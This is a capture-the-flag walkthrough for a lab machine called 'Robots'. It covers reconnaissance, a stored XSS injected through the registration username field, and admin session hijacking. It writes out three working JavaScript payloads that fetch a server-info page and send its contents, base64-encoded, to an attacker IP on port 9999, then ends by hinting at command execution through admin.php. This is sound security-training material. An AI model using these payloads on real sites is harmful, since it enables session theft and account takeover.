# Robots



## initial recon

![alt text](../assets/images/robots/image.png)

We can see there are two 3 ports open , port 22 is is open so there is an ssh is availabele , 

![alt text](<../assets/images/robots/image copy.png>)

Http apche is runnning on port 80 , and also we have a robots.txt available.


Disallow: /harming/humans
Disallow: /ignoring/human/orders
Disallow: /harm/to/self


These are the directorires

Nothing intersting in directory scanning, there is one admin page anyways, 

Register as a user to get more info

![alt text](<../assets/images/robots/image copy 3.png>)
![alt text](<../assets/images/robots/image copy 4.png>)

if this is the user name and date of birth then we can calculate the MD5 hash of the ID

By md5(username+ddmm)

I have registered as a user , we can see here an admin user is there, lets login to the user
![alt text](<../assets/images/robots/image copy 7.png>)

The name guest is displaying here 

From the source code we can see ther is a variable called username to store the uservalue and that is reflected to this page after sumbitting the credentials.
So it could be vulnerable to xss , we can try to register another user with creds


Username: <script>alert("hacked");</script>
DOB: 01/01/2002

Then the password could be "b2ab116aa3d14df99053e490438ac0a8"

![alt text](<../assets/images/robots/image copy 8.png>)

So we can execute quries

Although this XSS allows us to send requests from the admin user, we can’t retrieve the cookie of the admin account because it’s HTTPOnly, which means we can’t retrieve it via JavaScript.

<script>(async()=>{try{const r=await fetch('/harm/to/self/server_info.php');if(!r.ok)throw`HTTP ${r.status}`;const d=await r.text();await fetch(`http://10.17.86.42:9999/${btoa(d)}`,{mode:'no-cors'})}catch(e){console.error(e)}})();</script>

Or

<script>fetch('/harm/to/self/server_info.php').then(r=>r.text()).then(data=>fetch('http://10.17.86.42:9999/'+btoa(data)))</script>

Or 

<script>fetch('/harm/to/self/server_info.php').then(response => {return response.text();}).then(data => {fetch("http://10.14.86.42:9999/"+btoa(data));})</script>




This is the payload that I have used

![alt text](<../assets/images/robots/image copy 11.png>)


Its base64 encoded we can decode this go get the session id for admin


![alt text](<../assets/images/robots/image copy 12.png>)

We can edit the session id of our user login and get the admin user 


![alt text](<../assets/images/robots/image copy 13.png>)

![alt text](<../assets/images/robots/image copy 14.png>)
 now we logged in as admin user


I have used fuff to enumerate more directory that can access with admin, 

![alt text](<../assets/images/robots/image copy 15.png>)

We can see and admin.php page


![alt text](<../assets/images/robots/image copy 16.png>)

We have a test url enrty. To we could possible get a C2 by this
